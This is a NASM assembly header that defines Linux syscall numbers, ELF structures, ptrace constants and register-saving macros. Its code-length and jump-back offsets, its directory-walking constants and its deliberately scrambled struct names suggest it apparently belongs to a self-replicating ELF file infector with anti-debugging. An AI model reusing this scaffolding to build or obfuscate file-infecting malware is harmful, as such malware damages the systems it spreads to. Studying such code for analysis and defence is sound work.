; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - zaxqU_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - dAPpbn4f_size) + x]

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

struc zaxqU
.FPujDQ resb PAGE_SIZE
.E5lKIwxWY: resb PAGE_SIZE
.jO0nhaBOO resq 1
.Ho9CRF: resd 1
.jBWpi8PVtD: resd 1
.V88zofCZD resq 1
endstruc

struc dAPpbn4f
.I3N1qWMGEF resq 1
.ZcFHcI resq 1
.oTlKX resq 1
.rdEHTCOmK resb 1
.e75FLCIy resq 1
.RPBLbBHlr resq 1
.kQsSjHTL resq 1
.j58wDKr resq 1
.HjVxtI resq 1 
.zeLO1lqksJ resq 1
.zs3Dkg0aQ7 resq 1
.nUJx2 resb 1
.oTLzDWWOP resq 1
.o3tt58G9h resq 1
.HW9ycoiSF resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc bWWD5jh
.OGtcP: resb 16
.OWDliJN6C: resw 1
.RECZ6: resw 1
.phCyuML: resd 1
.POtz1x: resq 1
.XKlQRh6: resq 1
.hmDFAvEgk: resq 1
.JDhX9rAKF: resd 1
.Yg1T9PI: resw 1
.D74n1: resw 1
.xMNdNqd9K: resw 1
.qbknFv: resw 1
.Qvqny1P: resw 1
.gtTDggknp: resw 1
endstruc

struc WoV51z
.uYFL0Z: resd 1
.mvGjDFFQdS: resd 1
.TjEnfr: resq 1
.EyMbEwRr: resq 1
.mXwGU: resq 1
.sQ2QfPi: resq 1
.dfgrvok: resq 1
.Ne43wWnme: resq 1
endstruc

struc obwyis6Pw
.PQUP5es: resd 1
.R1ttog: resd 1
.bIPrt: resq 1
.l0NJ4jXSvG: resq 1
.lqI8a: resq 1
.dZdpaD: resq 1
.vL08Bjwwun: resd 1
.EhP6yxbEh: resd 1
.sY2AfrGM resq 1
.uFtFwIlj resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 